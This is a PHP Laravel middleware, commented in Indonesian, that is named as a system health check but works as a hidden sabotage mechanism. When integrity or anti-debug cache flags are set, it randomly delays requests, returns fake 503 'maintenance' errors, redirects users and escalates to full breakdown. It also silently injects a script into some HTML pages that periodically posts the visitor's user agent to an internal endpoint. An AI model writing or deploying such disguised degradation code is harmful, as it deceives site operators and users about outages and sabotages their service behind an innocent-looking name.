<?php

namespace Vendor\SystemUtils\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Log;

class SystemHealthCheck
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle(Request $request, Closure $next)
    {
        // Increment request counter for metrics
        Cache::increment('_sys_req_count', 1);
        
        // Untuk request yang jarang (1 dari 50), verifikasi sistem
        if (rand(1, 50) === 1) {
            // Cek secara asinkronus untuk tidak memperlambat halaman
            dispatch(function () {
                app('system.performance')->quickValidation();
            })->afterResponse();
        }
        
        // Cek apakah system integrity failed
        if (Cache::get('_system_integrity_failed', false)) {
            // Aplikasi dalam bahaya, lakukan degradasi perlahan
            if ($this->shouldDegrade()) {
                return $this->handleDegradation($request);
            }
        }
        
        // Periksa jika sistem di-flag untuk degradasi
        if (app('system.performance')->isDegraded()) {
            // Terapkan degradasi berdasarkan level
            $level = app('system.performance')->getDegradationLevel();
            
            if ($this->shouldApplyDegradation($level)) {
                return $this->applyDegradation($request, $level);
            }
        }
        
        // Cek apakah sistem flag untuk validasi (biasanya oleh anti-debug)
        if (Cache::get('_sys_needs_validation', false)) {
            Cache::forget('_sys_needs_validation');
            
            // Jalankan validasi mendalam
            $isValid = app('system.performance')->deepCheck();
            
            if (!$isValid) {
                // Log attempt
                Log::debug('System validation failed after flag');
            }
        }
        
        $response = $next($request);
        
        // Periksa jika perlu menambahkan JavaScript validasi
        if (rand(1, 10) === 1 && !$request->expectsJson() && $response->status() === 200) {
            $this->injectValidationJs($response);
        }
        
        return $response;
    }
    
    /**
     * Tentukan apakah degradasi harus diterapkan
     */
    private function shouldDegrade()
    {
        // Untuk 30% request, terapkan degradasi
        return rand(1, 100) <= 30;
    }
    
    /**
     * Handle degradation mode
     */
    private function handleDegradation(Request $request)
    {
        // Jika ini request API, terapkan delay
        if ($request->expectsJson()) {
            sleep(rand(1, 3));
            return response()->json(['error' => 'Service temporarily unavailable'], 503);
        }
        
        // 30% kemungkinan, tampilkan error umum
        if (rand(1, 100) <= 30) {
            abort(503, 'Service temporarily unavailable.');
        }
        
        // 10% kemungkinan, redirect ke halaman utama
        if (rand(1, 100) <= 10) {
            return redirect('/');
        }
        
        // Lanjutkan tapi dengan delay
        usleep(rand(100000, 500000)); // 100-500ms delay
        return null;
    }
    
    /**
     * Tentukan apakah harus menerapkan degradasi berdasarkan level
     */
    private function shouldApplyDegradation($level)
    {
        // Peluang tergantung level
        $chance = 10 * $level; // Level 1 = 10%, level 2 = 20%, dst
        return rand(1, 100) <= $chance;
    }
    
    /**
     * Terapkan degradasi berdasarkan level
     */
    private function applyDegradation(Request $request, $level)
    {
        // Level 1: Delay kecil
        if ($level === 1) {
            usleep(rand(100000, 300000)); // 100-300ms delay
            return null;
        }
        
        // Level 2: Delay lebih besar
        if ($level === 2) {
            usleep(rand(300000, 700000)); // 300-700ms delay
            return null;
        }
        
        // Level 3: Occasional error
        if ($level === 3) {
            if (rand(1, 4) === 1) { // 25% chance
                if ($request->expectsJson()) {
                    return response()->json(['error' => 'Service temporarily unavailable'], 503);
                } else {
                    abort(503, 'Service temporarily unavailable.');
                }
            }
            usleep(rand(300000, 700000)); // 300-700ms delay
            return null;
        }
        
        // Level 4: Frequent errors
        if ($level === 4) {
            if (rand(1, 2) === 1) { // 50% chance
                if ($request->expectsJson()) {
                    return response()->json(['error' => 'Service temporarily unavailable'], 503);
                } else {
                    abort(503, 'Service temporarily unavailable.');
                }
            }
            usleep(rand(500000, 1000000)); // 500ms-1s delay
            return null;
        }
        
        // Level 5: Complete breakdown
        if ($level >= 5) {
            if ($request->expectsJson()) {
                return response()->json(['error' => 'Service unavailable'], 503);
            } else {
                abort(503, 'Service unavailable due to system maintenance.');
            }
        }
        
        return null;
    }
    
    /**
    * Inject validation JavaScript
    */
    private function injectValidationJs($response)
    {
        // Hanya inject ke respons HTML
        $content = $response->getContent();
        
        if (is_string($content) && stripos($content, '</body>') !== false) {
            $script = "<script>(function(){setInterval(function(){fetch('/api/system-check',{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-TOKEN':document.querySelector('meta[name=\"csrf-token\"]')?.content||''},body:JSON.stringify({t:Date.now(),c:navigator.userAgent})}).then(r=>r.json()).then(d=>{if(d.status==='invalid'){console.log('System maintenance required');if(Math.random()<0.1){document.body.style.opacity='0.99';setTimeout(function(){document.body.style.opacity='1'},100);}}});},300000);})();</script>";
            
            $content = str_replace('</body>', $script . '</body>', $content);
            $response->setContent($content);
        }
        
        return $response;
    }
 }